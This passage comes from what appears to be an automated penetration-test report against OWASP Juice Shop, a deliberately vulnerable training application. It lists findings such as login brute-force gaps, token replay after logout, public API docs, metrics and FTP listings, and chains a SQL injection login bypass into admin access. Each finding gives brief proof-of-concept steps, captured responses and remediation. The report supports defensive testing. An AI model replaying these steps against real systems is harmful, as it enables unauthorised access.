(/#/bee-haven)🐝","imagePath":"assets/public/images/uploads/BeeHaven.png","createdAt":"2026-05-04T01:32:43.406Z","updatedAt":"2026-05-04T01:32:43.406Z","User":{"id":21,"username":"evmrox","email":"ethereum@juice-sh.op","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.375Z","updatedAt":"2026-05-04T01:32:37.375Z","deletedAt":null}},{"UserId":13,"id":5,"caption":"Sorted the pieces, starting assembly process...","imagePath":"assets/public/images/uploads/sorted-the-pieces,-starting-assembly-process-1721152307290.jpg","createdAt":"2026-05-04T01:32:43.406Z","updatedAt":"2026-05-04T01:32:43.406Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.372Z","updatedAt":"2026-05-04T01:32:37.372Z","deletedAt":null}},{"UserId":13,"id":6,"caption":"Building something literally bottom up...","imagePath":"assets/public/images/uploads/building-something-literally-bottom-up-1721152342603.jpg","createdAt":"2026-05-04T01:32:43.407Z","updatedAt":"2026-05-04T01:32:43.407Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.372Z","updatedAt":"2026-05-04T01:32:37.372Z","deletedAt":null}},{"UserId":13,"id":7,"caption":"Putting in the hardware...","imagePath":"assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg","createdAt":"2026-05-04T01:32:43.407Z","updatedAt":"2026-05-04T01:32:43.407Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.372Z","updatedAt":"2026-05-04T01:32:37.372Z","deletedAt":null}},{"UserId":13,"id":8,"caption":"Everything up and running!","imagePath":"assets/public/images/uploads/everything-up-and-running!-1721152385146.jpg","createdAt":"2026-05-04T01:32:43.407Z","updatedAt":"2026-05-04T01:32:43.407Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"[REDACTED_SECRET]","role":"deluxe","deluxeToken":"[REDACTED_SECRET]","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.372Z","updatedAt":"2026-05-04T01:32:37.372Z","deletedAt":null}},{"UserId":18,"id":9,"caption":"I love going hiking here...","imagePath":"assets/public/images/uploads/favorite-hiking-place.png","createdAt":"2026-05-04T01:32:43.425Z","updatedAt":"2026-05-04T01:32:43.425Z","User":{"id":18,"username":"j0hNny","email":"john@juice-sh.op","password":"[REDACTED_SECRET]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-05-04T01:32:37.374Z","updatedAt":"2026-05-04T01:32:37.374Z","deletedAt":null}},{"UserId":19,"id":10,"caption":"My old workplace...","imagePath":"assets/public/images/uploads/IMG_4253.jpg","createdAt":"2026-05-04T01:32:43.430Z","updatedAt":"2026-05-04T01:32:43.430Z","User":{"id":19,"username":"E=ma²","email":"emma@juice-sh.op","password":"[REDACTED_SECRET]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.s
```

### 20. Brute-force protection gap: POST /Login
- Severity: HIGH
- Status: validated
- Confidence: 0.80
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, rce-adjacent
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Multiple rapid login attempts did not trigger visible rate-limit or lockout controls.

**Proof Of Concept**
Send 8 failed login attempts to http://[REDACTED_HOST]/Login and confirm no 429/lockout response.

**Evidence**
8 rapid failed attempts completed in 0.19s with statuses [200, 200, 200, 200, 200, 200, 200, 200].

**Remediation**
Enforce account/IP rate limits, progressive backoff, and temporary lockouts on repeated failures.

### 21. Session token replay signal after logout
- Severity: HIGH
- Status: validated
- Confidence: 0.79
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Bearer token remained usable after logout attempt, indicating weak server-side token invalidation controls.

**Proof Of Concept**
Authenticate, attempt logout, then re-use the same token on whoami/profile endpoint.

**Evidence**
`GET http://[REDACTED_HOST]/rest/user/whoami` remained accessible with the same token after logout attempt.

**Remediation**
Implement token revocation or short-lived tokens with rotation and server-side invalidation checks.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/user/whoami
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 125
ETag: W/"7d-GvyDAsmsTTBBUVqZZ6hoqGframA"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Body Snippet:
{"user":{"id":1,"email":"admin@juice-sh.op","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png"}}
```

### 22. Public API documentation exposure
- Severity: MEDIUM
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: `/api-docs` returned HTTP 200 with sensitive operational content.

**Proof Of Concept**
GET http://[REDACTED_HOST]/api-docs

**Evidence**
`GET http://[REDACTED_HOST]/api-docs` returned HTTP 200.

**Remediation**
Restrict API documentation to trusted users or remove privileged routes from public docs.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api-docs
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Content-Length: 3106
ETag: W/"c22-H8FH9nKD8DeX/nvIRrte6ZjP2a4"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:

<!-- HTML for static distribution bundle build -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>Swagger UI</title>
  <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
  <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" /><link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
  <style>
    html
    {
      box-sizing: border-box;
      overflow: -moz-scrollbars-vertical;
      overflow-y: scroll;
    }
    *,
    *:before,
    *:after
    {
      box-sizing: inherit;
    }

    body {
      margin:0;
      background: #fafafa;
    }
  </style>
</head>

<body>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:absolute;width:0;height:0">
  <defs>
    <symbol viewBox="0 0 20 20" id="unlocked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8z"></path>
    </symbol>

    <symbol viewBox="0 0 20 20" id="locked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8zM12 8H8V5.199C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="close">
      <path d="M14.348 14.849c-.469.469-1.229.469-1.697 0L10 11.819l-2.651 3.029c-.469.469-1.229.469-1.697 0-.469-.469-.469-1.229 0-1.697l2.758-3.15-2.759-3.152c-.469-.469-.469-1.228 0-1.697.469-.469 1.228-.469 1.697 0L10 8.183l2.651-3.031c.469-.469 1.228-.469 1.697 0 .469.469.469 1.229 0 1.697l-2.758 3.152 2.758 3.15c.469.469.469 1.229 0 1.698z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow">
      <path d="M13.25 10L6.109 2.58c-.268-.27-.268-.707 0-.979.268-.27.701-.27.969 0l7.83 7.908c.268.271.268.709 0 .979l-7.83 7.908c-.268.271-.701.27-.969 0-.268-.269-.268-.707 0-.979L13.25 10z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow-down">
      <path d="M17.418 6.109c.272-.268.709-.268.979 0s.271.701 0 .969l-7.908 7.83c-.27.268-.707.268-.979 0l-7.908-7.83c-.27-.268-.27-.701 0-.969.271-.268.709-.268.979 0L10 13.25l7.418-7.141z"/>
    </symbol>


    <symbol viewBox="0 0 24 24" id="jump-to">
      <path d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="expand">
      <path d="M10 18h4v-2h-4v2zM3 6v2h18V6H3zm3 7h12v-2H6v2z"/>
    </symbol>

  </defs>
</svg>

<div id="swagger-ui"></div>

<script src="./swagger-ui-bundle.js"> </script>
<script src="./swagger-ui-standalone-preset.js"> </script>
<script src="./swagger-ui-init.js"> </script>



<style>
  .swagger-ui .topbar .download-url-wrapper { display: none } undefined
</style>
</body>

</html>
```

### 23. Public metrics endpoint exposes runtime telemetry
- Severity: MEDIUM
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: `/metrics` returned HTTP 200 with sensitive operational content.

**Proof Of Concept**
GET http://[REDACTED_HOST]/metrics

**Evidence**
`GET http://[REDACTED_HOST]/metrics` returned HTTP 200.

**Remediation**
Restrict metrics to trusted monitoring networks or authenticated monitoring identities.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/metrics
Status: 200
Headers:
Content-Type: text/plain; version=0.0.4; charset=utf-8
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close
Content-Length: 25238

Body Snippet:
# HELP file_uploads_count Total number of successful file uploads grouped by file type.
# TYPE file_uploads_count counter

# HELP file_upload_errors Total number of failed file uploads grouped by file type.
# TYPE file_upload_errors counter

# HELP juiceshop_startup_duration_seconds Duration juiceshop required to perform a certain task during startup
# TYPE juiceshop_startup_duration_seconds gauge
juiceshop_startup_duration_seconds{task="validateConfig",app="juiceshop"} 0.052416147
juiceshop_startup_duration_seconds{task="cleanupFtpFolder",app="juiceshop"} 0.090604809
juiceshop_startup_duration_seconds{task="validatePreconditions",app="juiceshop"} 0.199069787
juiceshop_startup_duration_seconds{task="datacreator",app="juiceshop"} 7.04677535
juiceshop_startup_duration_seconds{task="customizeApplication",app="juiceshop"} 0.063487992
juiceshop_startup_duration_seconds{task="customizeEasterEgg",app="juiceshop"} 0.053686744
juiceshop_startup_duration_seconds{task="ready",app="juiceshop"} 7.207

# HELP process_cpu_user_seconds_total Total user CPU time spent in seconds.
# TYPE process_cpu_user_seconds_total counter
process_cpu_user_seconds_total{app="juiceshop"} 19.821733

# HELP process_cpu_system_seconds_total Total system CPU time spent in seconds.
# TYPE process_cpu_system_seconds_total counter
process_cpu_system_seconds_total{app="juiceshop"} 5.869577

# HELP process_cpu_seconds_total Total user and system CPU time spent in seconds.
# TYPE process_cpu_seconds_total counter
process_cpu_seconds_total{app="juiceshop"} 25.69131

# HELP process_start_time_seconds Start time of the process since unix epoch in seconds.
# TYPE process_start_time_seconds gauge
process_start_time_seconds{app="juiceshop"} 1777858354

# HELP process_resident_memory_bytes Resident memory size in bytes.
# TYPE process_resident_memory_bytes gauge
process_resident_memory_bytes{app="juiceshop"} 315514880

# HELP process_virtual_memory_bytes Virtual memory size in bytes.
# TYPE process_virtual_memory_bytes gauge
process_virtual_memory_bytes{app="juiceshop"} 2001498112

# HELP process_heap_bytes Process heap size in bytes.
# TYPE process_heap_bytes gauge
process_heap_bytes{app="juiceshop"} 894742528

# HELP process_open_fds Number of open file descriptors.
# TYPE process_open_fds gauge
process_open_fds{app="juiceshop"} 23

# HELP process_max_fds Maximum number of open file descriptors.
# TYPE process_max_fds gauge
process_max_fds{app="juiceshop"} 524288

# HELP nodejs_eventloop_lag_seconds Lag of event loop in seconds.
# TYPE nodejs_eventloop_lag_seconds gauge
nodejs_eventloop_lag_seconds{app="juiceshop"} 0

# HELP nodejs_eventloop_lag_min_seconds The minimum recorded event loop delay.
# TYPE nodejs_eventloop_lag_min_seconds gauge
nodejs_eventloop_lag_min_seconds{app="juiceshop"} 0.00297984

# HELP nodejs_eventloop_lag_max_seconds The maximum recorded event loop delay.
# TYPE nodejs_eventloop_lag_max_seconds gauge
nodejs_eventloop_lag_max_seconds{app="juiceshop"} 0.157155327

# HELP nodejs_eventloop_lag_mean_seconds The mean of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_mean_seconds gauge
nodejs_eventloop_lag_mean_seconds{app="juiceshop"} 0.010181243540677006

# HELP nodejs_eventloop_lag_stddev_seconds The standard deviation of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_stddev_seconds gauge
nodejs_eventloop_lag_stddev_seconds{app="juiceshop"} 0.0010199324337271426

# HELP nodejs_eventloop_lag_p50_seconds The 50th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p50_seconds gauge
nodejs_eventloop_lag_p50_seconds{app="juiceshop"} 0.010141695

# HELP nodejs_eventloop_lag_p90_seconds The 90th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p90_seconds gauge
nodejs_eventloop_lag_p90_seconds{app="juiceshop"} 0.010182655

# HELP nodejs_eventloop_lag_p99_seconds The 99th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p99_seconds gauge
nodejs_eventloop_lag_p99_seconds{app="juiceshop"} 0.011239423

# HELP nodejs_active_resources Number of active resources that are currently keeping the event loop alive, grouped by async resource type.
# TYPE nodejs_active_resources gauge
nodejs_active_resources{type="PipeWrap",app="juiceshop"} 2
nodejs_active_resources{type="FSEventWrap",app="juiceshop"} 1
nodejs_active_resources{type="TCPServerWrap",app="juiceshop"} 1
nodejs_active_resources{type="TCPSocketWrap",app="juiceshop"} 1
nodejs_active_resources{type="Timeout",app="juiceshop"} 7
nodejs_active_resources{type="Immediate",app="juiceshop"} 1

# HELP nodejs_active_resources_total Total number of active resources.
# TYPE nodejs_active_resources_total gauge
nodejs_active_resources_total{app="juiceshop"} 13

# HELP nodejs_active_handles Number of active libuv handles grouped by handle type. Every handle type is C++ class name.
# TYPE nodejs_active_handles gauge
nodejs_active_handles{type="Socket",app="juiceshop"} 3
nodejs_active_handles{type="FSWatcher",app="juiceshop"} 1
nodejs_active_handles{type="Server",app="juiceshop"} 1

# HELP nodejs_active_handles_total Total number of active handles.
# TYPE nodejs_active_handles_total gauge
nodejs_active_handles_total{app="juiceshop"} 5

# HELP nodejs_active_requests Number of active libuv requests grouped by request type. Every request type is C++ class name.
# TYPE nodejs_active_requests gauge

# HELP nodejs_active_requests_total Total number of active requests.
# TYPE nodejs_active_requests_total gauge
nodejs_active_requests_total{app="juiceshop"} 0

# HELP nodejs_heap_size_total_bytes Process heap size from Node.js in bytes.
# TYPE nodejs_heap_size_total_bytes gauge
nodejs_heap_size_total_bytes{app="juiceshop"} 235696128

# HELP nodejs_heap_size_used_bytes Process heap size used from Node.js in bytes.
# TYPE nodejs_heap_size_used_bytes gauge
nodejs_heap_size_used_bytes{app="juiceshop"} 121026280

# HELP nodejs_external_memory_bytes Node.js external memory size in bytes.
# TYPE nodejs_external_
```

### 24. Admin-route access unlocked by the bypass
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: A validated authentication or role bypass unlocked adjacent admin or privileged routes during the same run.

**Proof Of Concept**
Replay the validated bypass, then compare unauthenticated and bypass-authenticated access to the recorded admin route.

**Evidence**
Capability roll-up from already validated current-run findings:
- Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-configuration (high, validated)
- Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-version (high, validated)
- SQL injection authentication bypass: POST /rest/user/login (critical, validated)
- IDOR signal: GET /api/Users/:id (high, validated)
- Admin role injection during registration (critical, validated)
- SSRF internal fetch signal: /profile/image/url (high, validated)

**Remediation**
Fix the underlying primitive findings in this capability chain and retest the chained access path.

### 25. Public admin configuration disclosure
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Validated public or insufficiently protected access exposed administrative configuration material.

**Proof Of Concept**
Request the recorded admin configuration endpoint without privileged preconditions and compare the disclosed configuration response.

**Evidence**
Capability roll-up from already validated current-run findings:
- Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-configuration (high, validated)

**Remediation**
Fix the underlying primitive findings in this capability chain and retest the chained access path.

### 26. Public file disclosure
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Validated file or directory exposure disclosed files from a public/static file surface.

**Proof Of Concept**
Replay the recorded file or directory-listing requests and confirm exposed file names/content from the current target.

**Evidence**
Capability roll-up from already validated current-run findings:
- Unauthenticated sensitive endpoint exposure: GET /ftp/ (medium, validated)
- Unauthenticated sensitive endpoint exposure: GET /ftp/acquisitions.md (medium, validated)
- Unauthenticated sensitive endpoint exposure: GET /ftp/announcement_encrypted.md (medium, validated)
- Unauthenticated sensitive endpoint exposure: GET /ftp/incident-support.kdbx (medium, validated)
- Unauthenticated sensitive endpoint exposure: GET /ftp/legal.md (medium, validated)

**Remediation**
Fix the underlying primitive findings in this capability chain and retest the chained access path.

### 27. Public user secret disclosure
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Validated user/account endpoints exposed secret-adjacent fields such as password hashes, account recovery data, or user metadata.

**Proof Of Concept**
Replay the recorded user/account endpoint requests and confirm the secret-adjacent fields in the response artifacts.

**Evidence**
Capability roll-up from already validated current-run findings:
- JSONP callback execution surface: GET /rest/user/whoami (medium, validated)
- Account enumeration signal: GET /rest/user/security-question (medium, validated)
- Session token replay signal after logout (high, validated)
- Authenticated API response exposes password hash field (high, validated)
- Weak MD5 password hash cracking signal (high, validated)

**Remediation**
Fix the underlying primitive findings in this capability chain and retest the chained access path.

### 28. SQL injection login bypass to admin
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: A validated SQL injection authentication bypass produced or reached privileged/admin context in the same run.

**Proof Of Concept**
Replay the validated login-bypass request, then use the resulting session/token against the recorded privileged endpoint.

**Evidence**
Capability roll-up from already validated current-run findings:
- Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-configuration (high, validated)
- Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-version (high, validated)
- SQL injection authentication bypass: POST /rest/user/login (critical, validated)
- SQL injection data extraction signal: GET /rest/products/search (critical, validated)
- Account enumeration signal: GET /rest/user/security-question (medium, validated)
- IDOR signal: GET /api/Users/:id (high, validated)
- Authenticated API response exposes password hash field (high, validated)
- Weak MD5 password hash cracking signal (high, validated)

**Remediation**
Fix the underlying primitive findings in this capability chain and retest the chained access path.

### 29. Unauthenticated sensitive endpoint exposure: GET /ftp/
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ftp/

**Evidence**
`GET http://[REDACTED_HOST]/ftp/` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/ftp/
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Content-Length: 11322
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>listing directory /ftp/</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2, h3 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
h3 {
  margin: 5px 0 10px 0;
  padding-bottom: 5px;
  border-bottom: 1px solid #eee;
  font-size: 18px;
}
ul li {
  list-style: none;
}
ul li:hover {
  cursor: pointer;
  color: #2e2e2e;
}
ul li .path {
  padding-left: 5px;
  font-weight: bold;
}
ul li .line {
  padding-right: 5px;
  font-style: italic;
}
ul li:first-child .path {
  padding-left: 0;
}
p {
  line-height: 1.5;
}
a {
  color: #555;
  text-decoration: none;
}
a:hover {
  color: #303030;
}
#stacktrace {
  margin-top: 15px;
}
.directory h1 {
  margin-bottom: 15px;
  font-size: 18px;
}
ul#files {
  width: 100%;
  height: 100%;
  overflow: hidden;
}
ul#files li {
  float: left;
  width: 30%;
  line-height: 25px;
  margin: 1px;
}
ul#files li a {
  display: block;
  height: 25px;
  border: 1px solid transparent;
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
  overflow: hidden;
  white-space: nowrap;
}
ul#files li a:focus,
ul#files li a:hover {
  background: rgba(255,255,255,0.65);
  border: 1px solid #ececec;
}
ul#files li a.highlight {
  -webkit-transition: background .4s ease-in-out;
  background: #ffff4f;
  border-color: #E9DC51;
}
#search {
  display: block;
  position: fixed;
  top: 20px;
  right: 20px;
  width: 90px;
  -webkit-transition: width ease 0.2s, opacity ease 0.4s;
  -moz-transition: width ease 0.2s, opacity ease 0.4s;
  -webkit-border-radius: 32px;
  -moz-border-radius: 32px;
  -webkit-box-shadow: inset 0px 0px 3px rgba(0, 0, 0, 0.25), inset 0px 1px 3px rgba(0, 0, 0, 0.7), 0px 1px 0px rgba(255, 255, 255, 0.03);
  -moz-box-shadow: inset 0px 0px 3px rgba(0, 0, 0, 0.25), inset 0px 1px 3px rgba(0, 0, 0, 0.7), 0px 1px 0px rgba(255, 255, 255, 0.03);
  -webkit-font-smoothing: antialiased;
  text-align: left;
  font: 13px "Helvetica Neue", Arial, sans-serif;
  padding: 4px 10px;
  border: none;
  background: transparent;
  margin-bottom: 0;
  outline: none;
  opacity: 0.7;
  color: #888;
}
#search:focus {
  width: 120px;
  opacity: 1.0;
}

/*views*/
#files span {
  display: inline-block;
  overflow: hidden;
  text-overflow: ellipsis;
  text-indent: 10px;
}
#files .name {
  background-repeat: no-repeat;
}
#files .icon .name {
  text-indent: 28px;
}

/*tiles*/
.view-tiles .name {
  width: 100%;
  background-position: 8px 5px;
}
.view-tiles .size,
.view-tiles .date {
  display: none;
}

/*details*/
ul#files.view-details li {
  float: none;
  display: block;
  width: 90%;
}
ul#files.view-details li.header {
  height: 25px;
  background: #000;
  color: #fff;
  font-weight: bold;
}
.view-details .header {
  border-radius: 5px;
}
.view-details .name {
  width: 60%;
  background-position: 8px 5px;
}
.view-details .size {
  width: 10%;
}
.view-details .date {
  width: 30%;
}
.view-details .size,
.view-details .date {
  text-align: right;
  direction: rtl;
}

/*mobile*/
@media (max-width: 768px) {
  body {
    font-size: 13px;
    line-height: 16px;
    padding: 0;
  }
  #search {
    position: static;
    width: 100%;
    font-size: 2em;
    line-height: 1.8em;
    text-indent: 10px;
    border: 0;
    border-radius: 0;
    padding: 10px 0;
    margin: 0;
  }
  #search:focus {
    width: 100%;
    border: 0;
    opacity: 1;
  }
  .directory h1 {
    font-size: 2em;
    line-height: 1.5em;
    color: #fff;
    background: #000;
    padding: 15px 10px;
    margin: 0;
  }
  ul#files {
    border-top: 1px solid #cacaca;
  }
  ul#files li {
    float: none;
    width: auto !important;
    display: block;
    border-bottom: 1px solid #cacaca;
    font-size: 2em;
    line-height: 1.2em;
    text-indent: 0;
    margin: 0;
  }
  ul#files li:nth-child(odd) {
    background: #e0e0e0;
  }
  ul#files li a {
    height: auto;
    border: 0;
    border-radius: 0;
    padding: 15px 10px;
  }
  ul#files li a:focus,
  ul#files li a:hover {
    border: 0;
  }
  #files .header,
  #files .size,
  #files .date {
    display: none !important;
  }
  #files .name {
    float: none;
    display: inline-block;
    width: 100%;
    text-indent: 0;
    background-position: 0 50%;
  }
  #files .icon .name {
    text-indent: 41px;
  }
}
#files .icon-directory .name {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAWtQTFRFAAAA/PPQ9Nhc2q402qQ12qs2/PTX2pg12p81+/LM89NE9dto2q82+/fp2rM22qY39d6U+/bo2qo2/frx/vz32q812qs12qE279SU8c4w9NZP+/LK//367s9y7s925cp0/vzw9t92//342po2/vz25s1579B6+OSO2bQ0/v799NyT8tE79dld8Msm+OrC/vzx79KA2IYs7s6I9d6R4cJe9+OF/PLI/fry79OF/v30//328tWB89RJ8c9p8c0u9eCf//7+9txs6sts5Mdr+++5+u2z/vrv+/fq6cFz8dBs8tA57cpq+OaU9uGs27Y8//799NdX/PbY9uB89unJ//z14sNf+emh+emk+vDc+uys9+OL8dJy89NH+eic8tN5+OaV+OWR9N2n9dtl9t529+KF9+GB9Nue9NdU8tR/9t5y89qW9dpj89iO89eG/vvu2pQ12Y4z/vzy2Ict/vvv48dr/vzz4sNg///+2Igty3PqwQAAAAF0Uk5TAEDm2GYAAACtSURBVBjTY2AgA2iYlJWVhfohBPg0yx38y92dS0pKVOVBAqIi6sb2vsWWpfrFeTI8QAEhYQEta28nCwM1OVleZqCAmKCEkUdwYWmhQnFeOStQgL9cySqkNNDHVJGbiY0FKCCuYuYSGRsV5KgjxcXIARRQNncNj09JTgqw0ZbkZAcK5LuFJaRmZqfHeNnpSucDBQoiEtOycnIz4qI9bfUKQA6pKKqAgqIKQyK8BgAZ5yfODmnHrQAAAABJRU5ErkJggg==);
}
#files .icon-text .name {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAADoSURBVBgZBcExblNBGAbA2ceegTRBuIKOgiihSZNT
```

### 30. Unauthenticated sensitive endpoint exposure: GET /ftp/acquisitions.md
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/acquisitions.md` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ftp/acquisitions.md

**Evidence**
`GET http://[REDACTED_HOST]/ftp/acquisitions.md` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
